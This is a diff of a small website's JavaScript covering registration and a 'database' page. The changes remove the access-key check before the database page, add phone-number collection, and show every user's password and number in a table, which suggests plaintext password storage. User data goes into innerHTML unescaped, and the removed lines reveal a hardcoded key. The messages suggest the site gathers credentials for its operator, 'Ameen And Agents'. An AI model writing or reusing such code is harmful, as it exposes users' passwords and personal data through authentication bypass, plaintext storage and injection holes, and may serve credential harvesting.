@@ -1,5 +1,5 @@
 function showHelp() {
-    alert("This is the help message. You can add more detailed instructions here.");
+    alert("Hey I Am AmeenInt This Site Is Maintaining Mode. Its Not Completed Wait Few Days.");
 }
 
 function navigateToRegister() {
@@ -11,18 +11,14 @@ function navigateToLogin() {
 }
 
 function promptForKey() {
-    var key = prompt("Please enter the access key:");
-    if (key === "MEERAMEEN$") {
         window.location.href = "database.html";
-    } else {
-        alert("Invalid key. Access denied.");
-    }
 }
 
 document.getElementById('registerForm')?.addEventListener('submit', function (e) {
     e.preventDefault();
     var username = document.getElementById('username').value;
     var password = document.getElementById('password').value;
+    var number = document.getElementById('number').value;
 
     // Validate username (no spaces or symbols) and password (at least 8 characters, including numbers and symbols)
     var usernamePattern = /^[a-zA-Z0-9]+$/;
@@ -43,7 +39,7 @@ document.getElementById('registerForm')?.addEventListener('submit', function (e)
         headers: {
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ username, password }),
+        body: JSON.stringify({ username, password, number }),
     })
     .then(response => response.json())
     .then(data => {
@@ -89,15 +85,20 @@ function checkKey() {
             .then(response => response.json())
             .then(data => {
                 var content = document.getElementById('databaseContent');
-                content.innerHTML = "<h3>User Database:</h3>";
+                content.innerHTML = "<h3>DATABASE AMEENINT:</h3>";
                 var table = `<table>
                                 <tr>
                                     <th>Username</th>
-                                    <th>Registration Time</th>
+                                    <th>Password</th>
+                                    <th>Number</th>
+                                    <th>Time</th>
+                                    
                                 </tr>`;
                 data.forEach(user => {
                     table += `<tr>
                                 <td>${user.username}</td>
+                                <td>${user.password}</td>
+                                <td>${user.number}</td>
                                 <td>${user.registration_time}</td>
                               </tr>`;
                 });
@@ -108,6 +109,6 @@ function checkKey() {
                 console.error('Error:', error);
             });
     } else {
-        alert("Invalid key. Access denied.");
+        alert("Invalid key. Access denied. Only Ameen And Agents Can Access");
     }
 }
